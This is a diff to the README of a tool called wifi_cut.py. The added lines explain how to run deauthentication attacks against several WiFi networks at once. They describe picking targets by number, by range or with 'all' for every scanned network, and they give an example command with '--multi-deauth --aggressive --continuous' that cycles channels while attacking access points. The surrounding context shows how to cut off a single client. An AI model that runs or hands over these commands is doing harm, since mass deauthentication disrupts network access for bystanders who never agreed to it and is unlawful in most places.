@@ -120,6 +120,23 @@ sudo python3 wifi_cut.py
 - Enterprise SSIDs may have multiple APs with the same name ù the tool matches by SSID
 - If clients = 0, use option `5` or option `4` (works without client list)
 
+### Attack multiple WiFi networks
+
+At the target prompt:
+
+```
+Select target # (0=quit, all, or 1,3,5 / 2-6):
+```
+
+| Input | Meaning |
+|-------|---------|
+| `3` | Single network |
+| `1,4,7` | Three networks |
+| `2-6` | Networks #2 through #6 |
+| `all` | Every scanned network |
+
+Then pick continuous rotation or aggressive mode. One adapter rotates channels and attacks each AP in turn.
+
 ### Command line
 
 ```bash
@@ -141,6 +158,11 @@ sudo python3 wifi_cut.py -i wlan0 -b AA:BB:CC:DD:EE:FF --channel 6 --deauth-all 
 
 # Disconnect one client
 sudo python3 wifi_cut.py -i wlan0 -b AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 --deauth-all
+
+# Attack multiple networks (rotate channels)
+sudo python3 wifi_cut.py -i wlan0 \
+  --bssids AA:BB:CC:DD:EE:01,AA:BB:CC:DD:EE:02 \
+  --multi-deauth --aggressive --continuous
 ```
 
 ### Output legend
